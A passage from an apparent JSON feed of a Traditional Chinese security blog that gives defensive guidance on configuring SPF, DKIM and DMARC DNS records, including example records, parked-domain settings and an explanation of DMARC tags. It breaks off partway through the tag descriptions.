id=\"%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84\"><a class=\"direct-link\" href=\"#%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84\">#</a> 發布紀錄</h3>\n<p>建構好 SPF 紀錄後請在你的 DNS 裡以 TXT 類型發布出去，等待幾分鐘應該就可以在 mxtoolbox 上查詢到了。使用雲端 hosting provider服務請一樣參考官方文件：<a href=\"https://support.google.com/a/answer/10684623?hl=en&amp;ref_topic=10685331\">Gsuite</a>、<a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/set-up-spf-in-office-365-to-help-prevent-spoofing?view=o365-worldwide#create-or-update-your-spf-txt-record\">Office365</a>、<a href=\"https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-spf.html\">Amazon SES</a>。</p>\n<hr>\n<h2 id=\"dkim\"><a class=\"direct-link\" href=\"#dkim\">#</a> DKIM</h2>\n<p>DKIM 不同於 SPF 在於，一筆 SPF 紀錄就代表了一個寄信 domain，因此你有幾個會寄信的 domain 就要有幾筆 SPF 紀錄，但是 DKIM 是一個 domain 可以有很多筆的，只要各個 mail server 使用的 selector 都不同就好。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E8%87%AA%E6%9E%B6%E7%9A%84-email-server\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E8%87%AA%E6%9E%B6%E7%9A%84-email-server\">#</a> 情境一：自架的 email server</h3>\n<p>可以用這個 <a href=\"https://dmarcly.com/tools/dkim-record-generator\">DKIM generator</a> 來產生公私鑰，請把私鑰放入 mail server 設定中保管好，然後把公鑰從 DNS 發布出去。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E9%9B%B2%E7%AB%AF-hosting-provider\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E9%9B%B2%E7%AB%AF-hosting-provider\">#</a> 情境二：雲端 hosting provider</h3>\n<p>如果你使用的是雲端 hosting provider 的服務，例如用 Microsoft Office365 或是 Gsuite，那麼 DKIM 的設定已經內建了幾乎不用你做。如果你想用自己的key pair 也可以，跟著教學設定：<a href=\"https://support.google.com/a/answer/174126\">Gsuite</a>、<a href=\"https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/use-dkim-to-validate-outbound-email?view=o365-worldwide\">Office365</a>、<a href=\"https://docs.aws.amazon.com/ses/latest/DeveloperGuide/send-email-authentication-dkim-easy-setup-domain.html\">Amazon SES</a> 就可以了，他還會幫你發布到 DNS。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> 情境三：第三方服務</h3>\n<p>如果是其他第三方服務（marketing email 等等），做法往往是請你發一筆 CNAME 紀錄指到由第三方服務實際創造並發布的公鑰，這樣就可以由第三方服務統一管理公私鑰，你也不用擔心 DKIM 沒發好。</p>\n<p>舉例來說，如果是用 SendGrid，完成 “Settings/Sender Authentication/Authenticate Your Domain” 的流程後會來到這一頁：</p>\n<p><img src=\"/img/posts/crystal/email-sec-examples/dmarcly.png\" alt=\"\"></p>\n<p>你就照著發在 DNS 就好，如下：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">//我們發布的<br>s1._domainkey.example.com CNAME s1.domainkey.uXXX.wlXXX.sendgrid.net<br><br>//sendgrid 發布的<br>s1.domainkey.uXXX.wlXXX.sendgrid.net TXT \"v=DKIM1; k=rsa;....\"</code></pre>\n<hr>\n<h2 id=\"dmarc\"><a class=\"direct-link\" href=\"#dmarc\">#</a> DMARC</h2>\n<p>以下皆建議採最嚴格的設置，若擔心使用 <code>p=reject</code> 會太過嚴苛造成困擾請至少使用 <code>p=quarantine</code>。</p>\n<p>以下範例請把 <code>rua</code> 跟 <code>ruf</code> 中的 <code>xx</code> 換成自己的信箱。可以在寄信網域中設定一個專門接收報告的信箱（例如 OneDegree 就創立了一個 <code>dmarc.reporting@onedegree.hk</code>），或是如果有使用第三方的 DMARC reporting 功能（例如 <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>）就換成他們提供的信箱。</p>\n<p>如果決定把報告寄到其他網域的話，務必注意收信人網域有沒有授權接收報告。根據 RFC 規範，收信人網域需要在 <code>&lt;dmarc domain&gt;._report._dmarc.&lt;reporting domain&gt;</code> 發一筆 DMARC 紀錄來授權報告寄送。假設 DMARC 紀錄網域：<a href=\"http://sender.com\">sender.com</a>，收報告地址為：report@thirdparty.com，則 <a href=\"http://thirdparty.com\">thirdparty.com</a> 要在 <code>sender.com._report._dmarc.thirdparty.com</code> 發一筆內容為 <code>v=DMARC1</code> 的 TXT 紀錄。這個機制的目的一來是為了防止有人故意用大量報告對第三方的收信人做垃圾信件攻擊（spamming），二來也是保護發行 DMARC 紀錄的網域不要讓過多資訊外流。</p>\n<p>豆知識：前面提到的 <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>，就是設定接收所有報告哦！<code>*._report._dmarc.rep.dmarcanalyzer.com TXT &quot;v=DMARC1;&quot;</code></p>\n<p>另外，如果你是第一次設定，建議 <code>p=reject</code> 先改成 <code>p=none</code> 防止信件突然都被擋掉。請確認每日的彙整報告結果符合預期，並搭配手動檢查原始信件看看不同收信 mail server 效果如何，等實驗了一陣子都沒問題，再逐漸改成更嚴格的 <code>p=quarantine</code> ，穩定後使用 <code>p=reject</code>。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%AF%A6%E9%A9%97%E4%B8%AD\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80%EF%BC%9A%E5%AF%A6%E9%A9%97%E4%B8%AD\">#</a> 情境一：實驗中</h3>\n<p>如果你還在實驗階段，不希望所有的信都被擋下，可以用寬鬆一點的 policy 或是低一點的 percentage 讓部分信件通過驗證：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">// lax policy  <br>v=DMARC1 p=none rua=mailto:xx ruf=mailto:xx<br><br>// lower percentage of policy application  <br>v=DMARC1 p=quarantine pct=20 rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E6%B2%92%E6%9C%89%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C%EF%BC%9A%E6%B2%92%E6%9C%89%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> 情境二：沒有子網域</h3>\n<p>如果寄信網域只有一個，或是沒有多個子網域共用 DMARC 紀錄：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject aspf=s adkim=s rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%AD%90%E7%B6%B2%E5%9F%9F%E5%85%B1%E7%94%A8-dmarc\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%89%EF%BC%9A%E5%AD%90%E7%B6%B2%E5%9F%9F%E5%85%B1%E7%94%A8-dmarc\">#</a> 情境三：子網域共用 DMARC</h3>\n<p>如果 DMARC 紀錄涵蓋多個子網域：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject rua=mailto:xx ruf=mailto:xx</code></pre>\n<p>如果你想為子網域設定寬鬆一點的 policy，也可以用 <code>sp</code></p>\n<pre class=\"language-txt\"><code class=\"language-txt\">v=DMARC1 p=reject sp=quarantine rua=mailto:xx ruf=mailto:xx</code></pre>\n<h3 id=\"%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84-2\"><a class=\"direct-link\" href=\"#%E7%99%BC%E5%B8%83%E7%B4%80%E9%8C%84-2\">#</a> 發布紀錄</h3>\n<p>請在你的 DNS 裡以 TXT 類型發布到 <code>_dmarc.&lt;yourdomain&gt;</code> 這個網域，應該一樣幾分鐘就可以在 mxtoolbox 上查詢到了。如果有把報告寄到其他網域，也請確定有發布授權紀錄。</p>\n<h3 id=\"%E4%B8%8D%E5%AF%84%E4%BF%A1%E7%9A%84%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E4%B8%8D%E5%AF%84%E4%BF%A1%E7%9A%84%E7%B6%B2%E5%9F%9F\">#</a> 不寄信的網域</h3>\n<p>上面講了會寄信的網域該如何設置，那不寄信的網域怎麼辦呢？畢竟什麼都沒設置的話，駭客用這些子網域寄信就能躲過驗證啊！</p>\n<p>很簡單，明文禁止所有信件就好。如果有很多個不寄信的網域的話，也可以用 CNAME 的方式指到一筆紀錄，方便管理。</p>\n<pre class=\"language-txt\"><code class=\"language-txt\"># SPF<br>record: v=spf1 -all  <br>DNS: parked.mydom.com TXT \"v=spf1 -all\"<br><br># DKIM<br>record: v=DKIM1; p=  <br>DNS: \\*.\\_domainkey.parked.mydom.com TXT \"v=DKIM1; p=\"<br><br># DMARC<br>record: v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx  <br>## DNS for one parked domain:  <br>_dmarc.parked.mydom.com TXT \"v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx\"<br><br>## DNS for many parked domains:   <br>_dmarc.parked1.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parked2.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parked3.mydom.com CNAME _dmarc.parkeddoms.mydom.com  <br>_dmarc.parkeddoms.mydom.com TXT \"v=DMARC1; p=reject; rua=mailto:xx; ruf=mailto:xx\"</code></pre>\n<hr>\n<h3 id=\"resources\"><a class=\"direct-link\" href=\"#resources\">#</a> Resources</h3>\n<ul>\n<li><a href=\"https://dmarcly.com/blog/how-to-set-up-dmarc-dkim-and-spf-in-office-365-o365-the-complete-implementation-guide\">DMARCLY: Setting up SPF, DKIM, DMARC for Office365</a></li>\n<li><a href=\"https://dmarcly.com/blog/how-to-set-up-spf-and-dkim-for-amazon-ses\">DMARCLY: Setting up SPF, DKIM for Amazon SES</a></li>\n<li><a href=\"https://dmarcly.com/blog/spf-dkim-dmarc-set-up-guide-for-g-suite-gmail-for-business\">DMARCLY: Setting up SPF, DKIM, DMARC for Gsuite</a></li>\n</ul>\n<p><strong>SPF domains for common third party services:</strong></p>\n<table>\n<thead>\n<tr>\n<th>Service</th>\n<th>SPF</th>\n<th>Lookups</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Google</td>\n<td><code>_spf.google.com</code></td>\n<td>4</td>\n</tr>\n<tr>\n<td>Microsoft (Office 365)</td>\n<td><code>spf.protection.outlook.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Amazon SES</td>\n<td><code>amazonses.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>MailChimp</td>\n<td><code>servers.mcsv.net</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>SendGrid</td>\n<td><code>sendgrid.net</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>FreshDesk</td>\n<td><code>email.freshdesk.com</code></td>\n<td>7 (includes sendgrid)</td>\n</tr>\n<tr>\n<td>Mandrill</td>\n<td><code>spf.mandrillapp.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Mailgun</td>\n<td><code>mailgun.org</code></td>\n<td>3</td>\n</tr>\n<tr>\n<td>Mimecast</td>\n<td><code>_netblocks.mimecast.com</code></td>\n<td>6</td>\n</tr>\n<tr>\n<td>Postmark</td>\n<td><code>spf.mtasv.net</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>HelpScout</td>\n<td><code>helpscoutemail.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Qualtrics</td>\n<td><code>_spf.qualtrics.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>SparkPost</td>\n<td><code>sparkpostmail.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Zoho</td>\n<td><code>zoho.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Salesforce</td>\n<td><code>_spf.salesforce.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Zendesk</td>\n<td><code>mail.zendesk.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>ConstantContact</td>\n<td><code>spf.constantcontact.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Sendinblue</td>\n<td><code>sendinblue.com</code></td>\n<td>9 (includes google and zendesk)</td>\n</tr>\n<tr>\n<td>MailerLite</td>\n<td><code>_spf.mlsend.com</code></td>\n<td>1</td>\n</tr>\n<tr>\n<td>Keap</td>\n<td><code>infusionmail.com</code></td>\n<td>2</td>\n</tr>\n<tr>\n<td>Sendpulse</td>\n<td><code>mxsmtp.sendpulse.com</code></td>\n<td>1</td>\n</tr>\n</tbody>\n</table>\n",
      "date_published": "2021-07-16T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-dkimdmarc/",
      "title": "關於 email security 的大小事 — 設定篇 DKIM、DMARC",
      "content_html": "<!-- summary -->\n<p>接續著前一篇，我們來講講 DKIM 跟 DMARC 的設定。</p>\n<!-- summary -->\n<p>老話一句，這裡的『設定』並不是回答你『如何在 google 或是 Office365 設好這些紀錄』、『用 XX 服務結果信寄不到怎麼辦』，這種操作配置的教學文請參考官方文件，畢竟 email provider 千千百百家，各自可能有的問題更是難以彙整。</p>\n<p>我想告訴你的『設定』是 SPF、DMARC 的 DNS 紀錄本身有哪些標籤，以及設置這些選項時可能不小心踩到哪些地雷，導致收信方的 email server 在驗證你的郵件時出現非預期地報錯，而判斷驗證失敗。另外，也會告訴你如果有多個子網域，或有使用第三方寄信服務時該怎麼辦。</p>\n<p>總之，可以想成是回答你『我該怎麼理解這些紀錄』和『每個機制有哪些選項跟限制』，而不是針對單一 email provider 的教學文。</p>\n<p>有不懂或是想了解更多範例與延伸議題，請看本系列其他篇～<br>\n如果你還不太懂 SPF、DKIM、DMARC 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory\">關於 email security 的大小事 — 原理篇</a><br>\n如果你在找 SPF 的設定 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-settings-spf\">關於 email security 的大小事 — 設定篇 SPF</a><br>\n如果你想搭配設定範例 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-examples\">關於 email security 的大小事 — 範例篇</a><br>\n如果你想了解延伸議題 👉 <a href=\"https://tech-blog.cymetrics.io/posts/crystal/email-sec-extra\">關於 email security 的大小事 — 延伸篇</a></p>\n<hr>\n<h2 id=\"dkim\"><a class=\"direct-link\" href=\"#dkim\">#</a> DKIM</h2>\n<p>我們先從 DKIM 開始，因為對設置者來說，他是標籤彈性最小、可控選項最少的驗證機制，所以也不太容易出錯。</p>\n<p>回顧我們在原理篇看到的 DKIM signature，裡面有非常多欄位，包含版本、加密法、時間戳、網域等等。舉例來說，當收信方的 email server 看到下圖這個 DKIM signature，就會用裡面的 <code>s=brisbane,d=example.net</code> 組合出 DKIM 公鑰發行的網域：<code>brisbane._domainkey.example.net</code>，再用找到的公鑰解密 <code>bh</code>（body hash） 來比對雜湊（hash），進而驗證信件真實性。</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/dkim-signature.png\" alt=\"\"></p>\n<p>一般來說，你的 email provider 都會提供給你產生 DKIM 的工具，裡面的網域名稱、加密演算法等等都不能更改，可以配置的通常只有：</p>\n<ul>\n<li>金鑰長度：1024 或是 2048 位元。</li>\n<li>prefix selector：也就是欄位中的 <code>s</code>，會跟 <code>d</code> 一起用於 DNS 查詢，用來辨識不同的 DKIM 公鑰。這個值可以是任何字串，不過因為是用來組成發布 DKIM 紀錄的網域名，所以 <code>(s,d)</code> 必須是 unique 的。</li>\n</ul>\n<p>設定完成後就把公鑰發布在 <code>&lt;selector&gt;._domainkey.&lt;domain&gt;</code> 這個網域下，以 onedegree 為例，存在如下的一筆 DKIM 紀錄：</p>\n<p><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/onedegree-dkim.png\" alt=\"\"></p>\n<p>根據 RFC，DKIM signature 產生於 Administrative Management Domains (ADMDs)，在信件的 creation 與 relay 均可能發生，也就是說一封信件可能是經過多次簽名的，例如我們之前提過的轉發（forwarding）就會保留原始信件的簽章並且加上中繼 email server 自己的的簽章。當信件內有多個 DKIM signature，每一個都會被驗證，不過只需要其中一個同時符合 verification 跟 alignment，DMARC 就會判定為 pass。</p>\n<h3 id=\"%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\"><a class=\"direct-link\" href=\"#%E5%A4%9A%E5%80%8B%E5%AD%90%E7%B6%B2%E5%9F%9F\">#</a> 多個子網域</h3>\n<p>如果你有多個會寄信的網域，就要為每一個分別設置 DKIM，只要他們的 selector 不同即可。例如你設置了以下兩個網域：</p>\n<ul>\n<li><code>mydom.com</code>： <code>selector=happy, DNS at happy._domainkey.mydom.com</code></li>\n<li><code>sub.mydom.com</code>： <code>selector=sad, DNS at sad._domainkey.sub.mydom.com</code></li>\n</ul>\n<p>那麼不同網域簽署寄出去的信會用各自的私鑰，驗證時也會查詢到對應的公鑰，一切順利。</p>\n<h3 id=\"%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\"><a class=\"direct-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8B%99\">#</a> 第三方服務</h3>\n<p>如果你有使用第三方的寄件服務，例如 SendGrid，他們會為你創造一把 DKIM 公私鑰，用自己的網域（例如 <code>sendgrid.net</code>）發布公鑰，再給你一筆 CNAME 型別的 DKIM 紀錄：</p>\n<p><code>happy._domainkey.mydom.com CNAME s1.domainkey.uXXX.wlXXX.sendgrid.net</code></p>\n<p>這樣收信方要驗證你由 SendGrid 發出的信時，就會先查詢 <code>happy._domainkey.mydom.com</code>，然後被導到實際帶有公鑰的網域 <code>s1.domainkey.uXXX.wlXXX.sendgrid.net</code>。</p>\n<hr>\n<h2 id=\"dmarc\"><a class=\"direct-link\" href=\"#dmarc\">#</a> DMARC</h2>\n<p>最後是 DMARC 啦～ 跟 SPF 比起來，DMARC 雖然標籤也不少，但地雷少得多，而且寄送報告的功能也能方便我們 debug 驗證失敗的郵件到底是哪裡出了問題。</p>\n<p>原理篇提過，DMARC 是建立在 SPF 與 DKIM 之上的大一統防線，所以當然是要先設好 SPF 與 DKIM 囉！那如果今天沒有把這兩個都設定好，難道 DMARC 就一定會 fail 嗎？</p>\n<p>其實也不會，你只是無法享受到完整的保護而已。DMARC 只會以有設置的機制判斷，所以假設只有設 SPF，那 DMARC 就只會對 SPF 做驗證跟 alignment 檢查，DKIM 會被自動忽略，這封信雖然一樣會寄到使用者信箱，但就不保證信件內容的真實性了。</p>\n<p>DMARC 運作流程可以用下面這張 RFC 裡定義的 flowchart 表示，重點注意紅色框框的部分。點點（…）代表 DNS query，星星（***）代表有 data exchange，所以可以看到 DMARC 是先得到 SPF 與 DKIM 的結果，再跟 author domain 進行 DNS query 拿到 DMARC 紀錄，如果成功找到紀錄就配合 SPF 與 DKIM 的結果得出 DMARC 驗證的結論，最後把驗證結果交給 MDA 做信件的過濾。</p>\n<p><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/flowchart.png\" alt=\"\"></p>\n<p>DMARC 驗證結果也會在原始信件裡留下紀錄。下圖紅框的地方分別是 SPF 與 DKIM 的驗證加上 alignment 檢查的結果，最後的 compauth 則是 DMARC 本身的驗證結果。因為 SPF 與 DKIM 都是 pass，所以 DMARC 也是 pass。</p>\n<p>另外，只要 SPF <strong>或</strong> DKIM 通過 alignment 檢查就可以，不用兩個都符合！</p>\n<p><img src=\"/img/posts/crystal/email-sec-settings-dkimdmarc/dmarc-result.png\" alt=\"\"></p>\n<p>接下來進入設定的部分。</p>\n<p>首先請注意，DMARC 設置的網域跟 SPF 不同，</p>\n<blockquote>\n<p>如果你的網域是 <code>mydom.com</code>，那 DMARC 就是在 <code>_dmarc.mydom.com</code> 這個子網域下的一筆 TXT 紀錄，放在 <code>mydom.com</code> 是無效的！</p>\n</blockquote>\n<p>值得補充的一點是，做 DNS query 的時候，如果沒在當前的網域找到 DMARC 紀錄，就會往上一層去找 organizational domain 的 DMARC 紀錄。所以假設你是用某個子網域（<code>mailing.mydom.com</code>）寄信，那當 <code>_dmarc.mailing.mydom.com</code> 沒有 DMARC 紀錄時，就會去抓 <code>_dmarc.mydom.com</code> 的，不過這時用的 policy 就會是 subdomain policy（請看下面的 <code>sp</code> 標籤）。這個特性允許我們更方便地設置跟監控 DMARC，不用特別為每個子網域重新設定一筆紀錄。</p>\n<p>再來我們看看 DMARC 有哪些標籤吧！標籤與標籤值之間皆以一個等號（<code>=</code>）區隔，中間不可以有任何空白。如果在解析 DMARC 紀錄的時候發生語法錯誤，例如：錯字、不在定義內的未知標籤或標籤值、重複的標籤、大小寫錯誤等等，都會直接被忽略。也就是說，出錯的地方會被套用預設標籤值，而這個預設值通常是最寬鬆、保護效果最差的。</p>\n<p>以下依據用途簡單分類了標籤，除了開頭必須是 <code>v=DMARC1</code> 並緊接唯一的必要標籤 <code>p</code> 之外，其他標籤都是 optional ，且順序是沒有規定的。</p>\n<h3 id=\"%E6%94%BF%E7%AD%96%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#%E6%94%BF%E7%AD%96%E7%9B%B8%E9%97%9C\">#</a> 政策相關</h3>\n<h5 id=\"p\"><a class=\"direct-link\" href=\"#p\">#</a> p</h5>\n<p>語法為： <code>p=action</code></p>\n<p>即 policy，也就是當 DMARC 驗證結果為 fail 時該採取的行動（action）。不過，這個 action 在 RFC 定義裡只是建議收信方遵照寄信方的意志而非強制（SHOULD … adhere ），實際的 action 仍由 MDA 決定。</p>\n<p>可能的標籤值為：</p>\n<ul>\n<li><code>reject</code>：指示於 SMTP 層做 rejection。可能是會回到 bounce address、回覆 SMTP client 一個 5XY error code（ex: 550）、或是回覆傳送成功但默默丟掉（discard）。</li>\n<li><code>quarantine</code>：指示收信方應將信件視為可疑（suspicious）。可能的處理方式包含：放到垃圾信件夾、集中到檢疫中心（quarantine center）等待管理員查看、送入信箱但加註某種標籤等等。</li>\n<li><code>none</code>：不指示任何 action。由收信方自由決定。</li>\n</ul>\n<p>在設置上建議採用最嚴格的 <code>reject</code>，不過實務上為避免設定有誤而導致信件突然都寄不到，造成營運上的影響，許多 email provider 會建議第一次設定 DMARC 時先用 <code>none</code>，觀察幾天的 DMARC report 以及信件原始內容的驗證結果，再逐漸調整成 <code>quarantine</code> 跟 <code>reject</code>。</p>\n<h5 id=\"sp\"><a class=\"direct-link\" href=\"#sp\">#</a> sp</h5>\n<p>語法為： <code>sp=action</code></p>\n<p>即 subdomain policy，概念與語法皆同上面的 <code>p</code>。使用場景如前面說過的，用子網域 <code>mailing.mydom.com</code> 寄信，但 <code>_dmarc.mailing.mydom.com</code> 沒有 DMARC 紀錄，這時會採用最上層 <code>_dmarc.mydom.com</code> 的紀錄（如果存在），且採用 subdomain policy 定義的 action。</p>\n<p>如果沒有定義 <code>sp</code>，預設會跟 <code>p</code> 一樣。</p>\n<h5 id=\"pct\"><a class=\"direct-link\" href=\"#pct\">#</a> pct</h5>\n<p>語法為： <code>pct=num</code></p>\n<p>即 percentage，就是要套用此 policy 的比例，概念上類似隨機 dropout 讓一部分的信件就算驗證結果是 fail 還是直接算他通過。因為 DMARC 可能導致信件突然都寄不到，所以為了不要讓這種 all-or-nothing 的特性導致大家不敢使用 DMARC，延伸出這種部分套用的機制，可以讓寄信方先實驗看看。不管信件是否因為 <code>pct</code> 機制而被保留，所有驗證 fail 的信件都會出現在彙整報告，方便寄信方 debug。</p>\n<p>如果一封信因為 <code>pct</code> 機制而被保留，採取的 action 因 policy 而異，基本上是放寬一個等級。例如本來要 <code>quarantine</code> 的就變成 <code>none</code>，本來該 <code>reject</code> 的就變成 <code>quarantine</code>。</p>\n<p><code>num</code> 介於 0 到 100 之間，預設是 100，也就是全部套用。</p>\n<h3 id=\"alignment-%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#alignment-%E7%9B%B8%E9%97%9C\">#</a> alignment 相關</h3>\n<h5 id=\"aspf\"><a class=\"direct-link\" href=\"#aspf\">#</a> aspf</h5>\n<p>語法為： <code>aspf=mode</code></p>\n<p>代表 alignment SPF，也就是在進行 SPF 的 alignment 檢查時採取的方式，預設為 <code>r</code>。</p>\n<p>可能的標籤值為：</p>\n<ul>\n<li><code>r</code> (relaxed)：寬鬆的比對，<code>smtp.MailFrom</code> 與 <code>header.From</code> 只要 organizational domain 相同即可（同一個根網域）。</li>\n<li><code>s</code> (strict)：嚴格的比對，<code>smtp.MailFrom</code> 與 <code>header.From</code> 需完全相同。</li>\n</ul>\n<h5 id=\"adkim\"><a class=\"direct-link\" href=\"#adkim\">#</a> adkim</h5>\n<p>語法為：<code>adkim=mode</code></p>\n<p>代表 alignment DKIM，也就是在進行 DKIM 的 alignment 檢查時採取的方式，預設為 <code>r</code>。</p>\n<p>可能的標籤值為：</p>\n<ul>\n<li><code>r</code> (relaxed)：寬鬆的比對，DKIM signature 的 <code>d=</code> 與 <code>header.From</code> 只要 organizational domain 相同即可（同一個根網域）。</li>\n<li><code>s</code> (strict)：嚴格的比對，DKIM signature 的 <code>d=</code> 與 <code>header.From</code> 需完全相同。</li>\n</ul>\n<h3 id=\"%E5%A0%B1%E5%91%8A%E7%9B%B8%E9%97%9C\"><a class=\"direct-link\" href=\"#%E5%A0%B1%E5%91%8A%E7%9B%B8%E9%97%9C\">#</a> 報告相關</h3>\n<h5 id=\"rua\"><a class=\"direct-link\" href=\"#rua\">#</a> rua</h5>\n<p>語法為：<code>rua=addr1,addr2,addr3…</code></p>\n<p>指示彙整報告（aggregate report）要寄送的位置，值為一串由逗號（<code>,</code>）分隔的 DMARC URI。RFC 定義 DMARC URI 為 <code>mailto:emailaddress</code>，例如 <code>mailto:woohoo@gmail.com</code>，如果指定了不合法的郵件位置會被忽略。</p>\n<p>不合法的 DMARC URI 地雷：</p>\n<ul>\n<li>收信人網域沒有 MX 紀錄：例如指定 <a href=\"mailto:abc@no-mx.com\">abc@no-mx.com</a>，因為 <a href=\"http://no-mx.com\">no-mx.com</a> 沒有 MX 紀錄，所以此信無法寄送。</li>\n<li>收信地址中有逗號（<code>,</code>）或是驚嘆號（<code>!</code>）：會造成解析上錯誤而被忽略。如必要請記得做 escaping 或 quoting。</li>\n<li>收信人網域沒有授權接收報告：如果收信人網域跟 DMARC 紀錄網域相同不會有這個問題，不過如果今天指定報告要寄送其他網域，則指定收信人網域需要在 <code>&lt;dmarc domain&gt;._report._dmarc.&lt;reporting domain&gt;</code> 發一筆 DMARC 紀錄來授權報告寄送。假設 DMARC 紀錄網域：<a href=\"http://sender.com\">sender.com</a>，收報告地址為：report@thirdparty.com，則 <a href=\"http://thirdparty.com\">thirdparty.com</a> 要在 <code>sender.com._report._dmarc.thirdparty.com</code> 發一筆內容為 <code>v=DMARC1</code> 的 TXT 紀錄。這個機制的目的一來是為了防止有人故意用大量報告對第三方的收信人做垃圾信件攻擊（spamming），二來也是保護發行 DMARC 紀錄的網域不要讓過多資訊外流。豆知識：有些提供 DMARC reporting 的第三方服務（例如 <a href=\"http://dmarcanalyzer.com\">dmarcanalyzer.com</a>），就會設定 <code>*._report._dmarc.rep.dmarcanalyzer.com TXT &quot;v=DMARC1;&quot;</code> 允許接收所有報告哦！</li>\n</ul>\n<p>彙整報告包含所有信件的 DMARC 驗證情況，不論成功還是失敗都會紀錄，內容包含採用的 DMARC 紀錄、SPF 與 DKIM 的結果、alignment 細節、最後的 policy 與實際執行的 action、還有驗證結果的統計數字等等。</p>\n<h5 id=\"ruf\"><a class=\"direct-link\" href=\"#ruf\">#</a> ruf</h5>\n<p>語法為：<code>ruf=addr1,addr2,addr3…</code></p>\n<p>指示失敗報告（failure report）要寄送的位置，值為一串由逗號（<code>,</code>）分隔的 DMARC URI。語法與地雷皆同上。</p>\n<p>失敗報告與彙整報告不同在於：</p>\n<ul>\n<li>彙整報告是每日（或是其他指定的區間）寄送一份，但失敗報告是在 DMARC 驗證失敗時馬上通知。</li>\n<li>失敗報告包含更詳細的資訊，例如原信件內容。</li>\n<li>失敗報告用於鑑識，觸發條件可以用下面的 <code>fo</code> 更細微控制。</li>\n</ul>\n<h5 id=\"fo\"><a class=\"direct-link\" href=\"#fo\">#</a> fo</h5>\n<p>語法為：<code>fo=0:1:d:s</code></p>\n<p>用來指示失敗報告的觸發機制，值為一串由冒號（<code>:</code>）分隔的標籤值（多選），預設為 <code>0</code>。若 DMARC 紀錄中沒有 <code>ruf</code>，<code>fo</code> 會被忽略。</p>\n<p>標籤值為：</p>\n<ul>\n<li><code>0</code>：如果沒有任何一種驗證得出 pass，也就是當 SPF、DKIM、alignment 通通都失敗的時候。</li>\n<li><code>1</code>：如果有任何一種驗證<strong>沒有</strong>得出 pass，也就是當 SPF、DKIM、alignment 有至少其中一種失敗的時候。</li>\n<li><code>d</code>：如果 DKIM 驗證失敗（不管 alignment）就觸發。</li>\n<li><code>s</code>：如果 SPF 驗證失敗（不管 alignment）就觸發。</li>\n</ul>\n<h5 id=\"rf\"><a class=\"direct-link\" href=\"#rf\">#</a> rf</h5>\n<p>語法為： 